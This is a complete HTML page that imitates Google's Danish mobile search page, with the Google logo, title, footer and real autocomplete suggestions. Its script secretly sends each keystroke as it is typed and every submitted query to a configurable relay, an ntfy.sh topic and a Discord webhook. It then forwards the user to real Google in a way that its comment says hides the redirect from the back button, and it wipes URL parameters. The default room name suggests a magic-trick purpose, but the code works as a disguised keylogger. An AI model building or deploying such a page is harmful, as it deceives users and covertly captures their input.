<!doctype html>
<html lang="da">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<meta name="apple-itunes-app" content="app-id=284815942">
<meta name="theme-color" content="#222429">
<meta name="color-scheme" content="dark">
<meta name="referrer" content="no-referrer">
<meta name="robots" content="noindex, nofollow">
<title>Google</title>
<link rel="icon" href="img/favicon.ico">
<link rel="apple-touch-icon" href="img/g-180.png">
<style>
  :root {
    --bg: #222429; --bg-focus: #202123; --box: #4d5155; --foot: #161719;
    --line: #3c4043; --text: #e8eaed; --dim: #bdc1c6; --muted: #9aa0a6; --blue: #8ab4f8;
  }
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  [hidden] { display: none !important; }
  html, body { margin: 0; background: var(--bg); color: var(--text); }
  body {
    font-family: Arial, Roboto, "Helvetica Neue", sans-serif;
    min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column;
    -webkit-text-size-adjust: 100%;
  }
  button { background: none; border: 0; padding: 0; color: inherit; font: inherit; cursor: pointer; }
  svg { display: block; fill: currentColor; }

  /* Topbar */
  header { display: flex; align-items: center; height: 54px; padding: 0 8px 0 16px; }
  .tabs { display: flex; height: 100%; }
  .tab { display: flex; align-items: center; height: 100%; padding: 0 8px; margin-right: 8px;
         font-size: 12px; font-weight: bold; letter-spacing: .6px; color: var(--muted); position: relative; }
  .tab.on { color: var(--blue); }
  .tab.on::after { content: ""; position: absolute; left: 0; right: 0; bottom: 0; height: 3px;
                   background: var(--blue); border-radius: 3px 3px 0 0; }
  .icons { margin-left: auto; display: flex; align-items: center; gap: 4px; }
  .ib { width: 48px; height: 48px; display: grid; place-items: center; color: var(--dim); position: relative; }
  .dot { position: absolute; top: 12px; right: 13px; width: 8px; height: 8px; border-radius: 50%;
         background: #f28b82; box-shadow: 0 0 0 2px var(--bg); }
  .avatar { width: 32px; height: 32px; border-radius: 50%; display: grid; place-items: center;
            font-size: 16px; color: #fff; margin: 0 4px; }
  .login { background: #8ab4f8; color: #202124; font-weight: bold; font-size: 14px;
           height: 36px; padding: 0 16px; border-radius: 18px; margin-left: 4px; }

  main { flex: 1; }
  .logo { display: block; width: 160px; height: 54px; margin: 38px auto 28px; object-fit: contain; }

  /* Søgefelt (samme input bruges i begge tilstande) */
  form { margin: 0 16px; }
  .box { display: flex; align-items: center; height: 48px; border-radius: 24px; background: var(--box); padding: 0 6px 0 14px; }
  .box .lead { color: var(--dim); width: 24px; flex: none; }
  .box .plus { display: none; color: var(--text); }
  input[type=search] {
    flex: 1; min-width: 0; height: 100%; border: 0; outline: 0; background: transparent; color: var(--text);
    font: 16px Arial, Roboto, sans-serif; padding: 0 10px; -webkit-appearance: none; appearance: none; caret-color: #8ab4f8;
  }
  input::-webkit-search-cancel-button, input::-webkit-search-decoration { -webkit-appearance: none; }
  input::placeholder { color: #9aa0a6; opacity: 1; }
  .tools { display: flex; align-items: center; }
  .tools .ib { width: 44px; height: 44px; color: var(--dim); }
  .clear { display: none; }

  .promo { text-align: center; margin-top: 28px; font-size: 14px; line-height: 20px; color: var(--dim); padding: 0 16px; }
  .promo a { color: var(--blue); }
  .promo .gem { display: inline-flex; align-items: center; gap: 6px; }
  .promo p { margin: 10px 0 0; }

  footer { background: var(--foot); font-size: 15px; color: var(--dim); }
  .country { padding: 15px 14px; border-bottom: 1px solid #3c4043; color: #bdc1c6; font-size: 16px; }
  .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px 24px; padding: 14px 16px calc(28px + env(safe-area-inset-bottom)); }
  .links span { color: var(--dim); }

  /* Fokus-tilstand: ligner skærmen efter tryk på søgefeltet */
  #list { display: none; }
  body.focus { background: var(--bg-focus); }
  body.focus header, body.focus .logo, body.focus .promo, body.focus footer { display: none; }
  body.focus form { margin: 0; }
  body.focus .box { height: 57px; border-radius: 0; background: transparent; padding: 0 4px 0 12px;
                    border-bottom: 1px solid #5f6368; }
  body.focus .box .search { display: none; }
  body.focus .box .plus { display: block; }
  body.focus input[type=search] { font-size: 18px; padding-left: 14px; }
  body.focus .ai { display: none; }
  body.focus.has .clear { display: grid; }
  body.focus.has .mic, body.focus.has .lens { display: none; }
  body.focus #list { display: block; }

  .row { display: flex; align-items: center; min-height: 48px; padding: 0 4px 0 12px; }
  .row .ic { width: 24px; height: 24px; color: var(--dim); flex: none; }
  .row .t { flex: 1; min-width: 0; padding: 12px 14px; font-size: 16px; color: var(--dim); font-weight: bold;
            overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .row .t b { color: var(--text); }
  .row.sg .t { font-weight: normal; }
  .row.sg .t b { font-weight: bold; }
  .row .x { width: 44px; height: 44px; display: grid; place-items: center; color: var(--dim); }
  .row .img { width: 32px; height: 32px; border-radius: 6px; object-fit: cover; margin-right: 6px; }
  .row .sub { display: block; font-size: 13px; color: var(--muted); font-weight: normal; margin-top: 2px; }
</style>
<script src="config.js"></script>
</head>
<body>

<header>
  <nav class="tabs"><span class="tab on">ALLE</span><span class="tab">BILLEDER</span></nav>
  <div class="icons" id="icons">
    <button class="ib" id="bell" hidden aria-label="Notifikationer">
      <svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
      <span class="dot"></span>
    </button>
    <button class="ib" aria-label="Google-apps">
      <svg width="24" height="24" viewBox="0 0 24 24"><circle cx="5" cy="5" r="2"/><circle cx="12" cy="5" r="2"/><circle cx="19" cy="5" r="2"/><circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/><circle cx="5" cy="19" r="2"/><circle cx="12" cy="19" r="2"/><circle cx="19" cy="19" r="2"/></svg>
    </button>
    <span id="me"></span>
  </div>
</header>

<main>
  <img class="logo" src="img/logo-light.png" alt="Google">

  <form id="f" action="https://www.google.com/search" method="get" role="search" autocomplete="off">
    <div class="box">
      <svg class="lead search" width="24" height="24" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
      <svg class="lead plus" width="24" height="24" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
      <input id="q" name="q" type="search" enterkeyhint="search" autocomplete="off" autocorrect="off"
             autocapitalize="off" spellcheck="false" aria-label="Søg">
      <div class="tools">
        <button type="button" class="ib clear" id="clear" aria-label="Ryd">
          <svg width="24" height="24" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
        <button type="button" class="ib ai" aria-label="AI-tilstand">
          <svg width="26" height="26" viewBox="0 0 24 24"><path d="M10 4.2a6 6 0 1 0 5.2 9.1l-1.6-1A4.1 4.1 0 1 1 10 6.1z"/><path d="M14.3 14.6l1.4-1.4 5.6 5.6-1.4 1.4z"/><path d="M17.2 2l.9 2.4 2.4.9-2.4.9-.9 2.4-.9-2.4-2.4-.9 2.4-.9z"/></svg>
        </button>
        <button type="button" class="ib mic" aria-label="Stemmesøgning">
          <svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
        </button>
        <button type="button" class="ib lens" aria-label="Søg med billede">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round"><path d="M4 9V7.5A3.5 3.5 0 0 1 7.5 4H9M15 4h1.5A3.5 3.5 0 0 1 20 7.5V9M4 15v1.5A3.5 3.5 0 0 0 7.5 20H9"/><circle cx="12" cy="12" r="3.2"/><circle cx="18" cy="18" r="1.6" fill="currentColor" stroke="none"/></svg>
        </button>
      </div>
    </div>
  </form>

  <div id="list"></div>

  <div class="promo">
    <span class="gem">
      <svg width="20" height="20" viewBox="0 0 24 24"><defs><linearGradient id="gg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#4285f4"/><stop offset=".5" stop-color="#9b72cb"/><stop offset="1" stop-color="#d96570"/></linearGradient></defs><path fill="url(#gg)" d="M12 1c.6 5.7 5.3 10.4 11 11-5.7.6-10.4 5.3-11 11-.6-5.7-5.3-10.4-11-11C6.7 11.4 11.4 6.7 12 1z"/></svg>
      <a>Omdan dine idéer til musik med Gemini 🎹</a>
    </span>
    <p>Google er tilgængelig på: &nbsp; <a>Føroyskt</a></p>
  </div>
</main>

<footer>
  <div class="country">Danmark</div>
  <div class="links">
    <span>Mørkt tema: Til</span><span>Indstillinger</span><span>Privatliv</span><span>Vilkår</span>
    <span>Annoncering</span><span>Erhverv</span><span>Om</span>
  </div>
</footer>

<script>
(() => {
  const C = Object.assign({ relay: '', room: 'magi', live: true, history: [], avatar: null,
    google: 'https://www.google.com/search?q=' }, window.FG_CONFIG || {});

  // Rum fra URL (?r=navn) – gemmes for sessionen og fjernes fra adresselinjen.
  try {
    const p = new URLSearchParams(location.search);
    const r = p.get('r') || p.get('room');
    if (r) sessionStorage.setItem('fg_room', r);
    const saved = sessionStorage.getItem('fg_room');
    if (saved) C.room = saved;
    if (location.search || location.hash) history.replaceState(null, '', location.pathname);
  } catch (e) {}
  C.room = String(C.room).replace(/[^a-zA-Z0-9-]/g, '').toLowerCase() || 'magi';
  const RELAY = C.relay ? C.relay.replace(/\/$/, '') + '/r/' + C.room : '';

  const $ = (id) => document.getElementById(id);
  const q = $('q'), form = $('f'), list = $('list');

  // Profil
  if (C.avatar) {
    $('bell').hidden = false;
    $('me').innerHTML = '<span class="avatar"></span>';
    const a = $('me').firstChild; a.textContent = C.avatar; a.style.background = C.avatarColor || '#4c2ea2';
  } else {
    $('me').innerHTML = '<button class="login" type="button">Log ind</button>';
  }

  // ---------- Afsendelse til relay / ntfy / Discord ----------
  function beacon(url, body) {
    try { if (navigator.sendBeacon && navigator.sendBeacon(url, body)) return; } catch (e) {}
    try { fetch(url, { method: 'POST', body, mode: 'no-cors', keepalive: true }); } catch (e) {}
  }
  const asText = (o) => new Blob([JSON.stringify(o)], { type: 'text/plain' });

  function sendFinal(text, via) {
    const at = Date.now();
    if (RELAY) beacon(RELAY, asText({ google: { q: text, at, via }, googleLive: { q: text, at, done: true } }));
    if (C.ntfy) beacon('https://ntfy.sh/' + encodeURIComponent(C.ntfy) + '?title=' + encodeURIComponent(C.ntfyTitle || 'Ny besked'),
                       new Blob([text], { type: 'text/plain' }));
    if (C.discord) { const fd = new FormData(); fd.append('content', text); beacon(C.discord, fd); }
  }

  let liveTimer = 0, lastLive = null;
  function sendLive() {
    if (!RELAY || !C.live) return;
    clearTimeout(liveTimer);
    liveTimer = setTimeout(() => {
      const v = q.value;
      if (v === lastLive) return;
      lastLive = v;
      fetch(RELAY, { method: 'POST', body: JSON.stringify({ googleLive: { q: v, at: Date.now() } }),
                     headers: { 'Content-Type': 'text/plain' }, keepalive: true }).catch(() => {});
    }, 250);
  }
  if (RELAY && C.live) fetch(RELAY, { method: 'POST', body: '{"googleLive":null}', headers: { 'Content-Type': 'text/plain' } }).catch(() => {});

  let gone = false;
  function go(text) {
    text = String(text || '').trim();
    if (!text || gone) return;
    gone = true;
    q.value = text;
    sendFinal(text, 'search');
    // Lille pause så beacon når ud, derefter til den ægte Google (replace = tilbage-knap afslører intet).
    setTimeout(() => location.replace(C.google + encodeURIComponent(text)), 60);
  }

  form.addEventListener('submit', (e) => { e.preventDefault(); q.blur(); go(q.value); });
  // Hvis siden genvises fra cache (tilbage-knap), nulstil.
  addEventListener('pageshow', (e) => { if (e.persisted) { gone = false; q.value = ''; unfocus(); } });

  // ---------- Fokus-tilstand ----------
  function focusMode() {
    if (!document.body.classList.contains('focus')) {
      document.body.classList.add('focus');
      q.placeholder = 'Spørg Google';
      window.scrollTo(0, 0);
      render();
    }
  }
  function unfocus() { document.body.classList.remove('focus', 'has'); q.placeholder = ''; }
  q.addEventListener('focus', focusMode);
  $('clear').addEventListener('pointerdown', (e) => { e.preventDefault(); q.value = ''; onInput(); q.focus(); });

  // ---------- Historik og forslag ----------
  const IC = {
    clock: '<svg class="ic" viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm0 18a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm.5-13H11v6l5.2 3.2.8-1.3-4.5-2.7V7z"/></svg>',
    search: '<svg class="ic" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>',
    x: '<svg width="24" height="24" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>',
    fill: '<svg width="24" height="24" viewBox="0 0 24 24"><path d="M5 15h2V8.41L18.59 20 20 18.59 8.41 7H15V5H5z"/></svg>',
  };
  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  let hist = (C.history || []).slice();
  let sugg = [];

  function render() {
    const v = q.value.trim();
    if (!v) {
      list.innerHTML = hist.map((h, i) =>
        `<div class="row" data-q="${esc(h)}">${IC.clock}<span class="t">${esc(h)}</span><button type="button" class="x" data-del="${i}">${IC.x}</button></div>`).join('');
    } else {
      list.innerHTML = sugg.map((s) => {
        const lead = s.img ? `<img class="img" src="${esc(s.img)}" alt="">` : IC.search;
        const sub = s.sub ? `<span class="sub">${esc(s.sub)}</span>` : '';
        return `<div class="row sg" data-q="${esc(s.text)}">${lead}<span class="t">${s.html}${sub}</span><button type="button" class="x" data-fill="${esc(s.text)}">${IC.fill}</button></div>`;
      }).join('');
    }
  }

  list.addEventListener('pointerdown', (e) => { if (e.target.closest('button')) e.preventDefault(); });
  list.addEventListener('click', (e) => {
    const del = e.target.closest('[data-del]');
    if (del) { hist.splice(+del.dataset.del, 1); render(); return; }
    const fill = e.target.closest('[data-fill]');
    if (fill) { q.value = fill.dataset.fill + ' '; onInput(); q.focus(); return; }
    const row = e.target.closest('.row');
    if (row) go(row.dataset.q);
  });

  // Ægte Google-forslag via JSONP (fejler stille, hvis de ikke kan hentes).
  let seq = 0;
  function suggest(v) {
    const id = ++seq, cb = '__fg' + id, s = document.createElement('script');
    window[cb] = (data) => {
      delete window[cb]; s.remove();
      if (id !== seq) return;
      try {
        sugg = (data[0] || []).slice(0, 8).map((it) => {
          const html = String(it[0]).replace(/<(?!\/?b>)[^>]*>/g, '');
          const tmp = document.createElement('span'); tmp.innerHTML = html;
          const meta = it[3] || {};
          return { html, text: tmp.textContent, sub: meta.zi || '', img: meta.zs || '' };
        });
      } catch (e) { sugg = []; }
      render();
    };
    s.onerror = () => { delete window[cb]; s.remove(); };
    s.src = 'https://www.google.com/complete/search?client=gws-wiz&hl=da&gl=dk&q=' + encodeURIComponent(v) + '&callback=' + cb;
    document.head.appendChild(s);
  }

  let sugTimer = 0;
  function onInput() {
    const v = q.value.trim();
    document.body.classList.toggle('has', q.value.length > 0);
    sendLive();
    clearTimeout(sugTimer);
    if (!v) { sugg = []; seq++; render(); return; }
    sugTimer = setTimeout(() => suggest(v), 80);
  }
  q.addEventListener('input', onInput);
})();
</script>
</body>
</html>
